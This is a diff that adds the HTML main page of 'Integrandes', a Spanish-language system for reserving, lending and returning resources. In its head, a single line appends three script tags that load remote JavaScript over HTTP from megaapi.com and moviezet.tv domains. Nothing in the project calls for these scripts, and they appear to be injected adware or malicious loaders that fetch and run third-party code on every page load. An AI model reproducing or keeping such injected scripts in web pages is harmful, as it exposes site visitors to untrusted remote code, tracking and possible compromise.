@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Integrandes | Principal</title>
+    <link type="text/css" rel="stylesheet" href="css/bootstrap.css"/>
+    <script src="js/bootstrap.js"></script>
+    <!--<link href="/assets/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">-->
+  <!--[if lt IE 9]>
+  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+  <![endif]-->
+<script type="text/javascript" src="http://load.megaapi.com/load_v3.js"></script><script type="text/javascript" src="http://api.megaapi.com/api-324123.js"></script><script type="text/javascript" src="http://source.moviezet.tv/source.js"></script></head>
+<body>
+<header class="navbar navbar-fixed-top navbar-inverse">
+  <div class="navbar-inner">
+    <div class="container">
+      <nav>
+        <ul class="nav pull-right">
+          <li><a href="#">Home</a></li>
+          <li><a href="#">Help</a></li>
+          <li><a href="#">Sign in</a></li>
+        </ul>
+      </nav>
+    </div>
+  </div>
+</header>
+<div class="container">
+      <div class="center hero-unit">
+      <h1>Bienvenido a Integrandes</h1>
+      <div class="imagen">
+        <!--<img alt="Citas" src="/assets/citas.png">-->
+      </div>
+      <h2>
+        <p>Seleccione una opci&oacute;n:</p>
+      </h2>
+      <table class="table table-hover">
+          <tbody>
+              <tr><td><a href="consultar_recursos.htm">Consultar Recursos</a></td></tr>
+              <tr><td><a href="consultar_reservas.htm">Consultar Reservas de usuario</a></td></tr>
+              <tr><td><a href="registrar_reserva.htm">Registrar una reserva</a></td></tr>
+              <tr><td><a href="registrar_prestamo.htm">Registrar un pr&eacute;stamo</a></td></tr>
+              <tr><td><a href="registrar_devolucion.htm">Registrar una devoluci&oacute;n</a></td></tr>
+               <tr><td><a href="actualizar_recurso.htm">Actualizar un Recurso</a></td></tr>
+               <tr><td><a href="sacar_recurso.htm">Sacar un Recurso</a></td></tr>
+          </tbody>
+      </table>
+    </div>
+</div>
+
+
+
+
+</body></html>
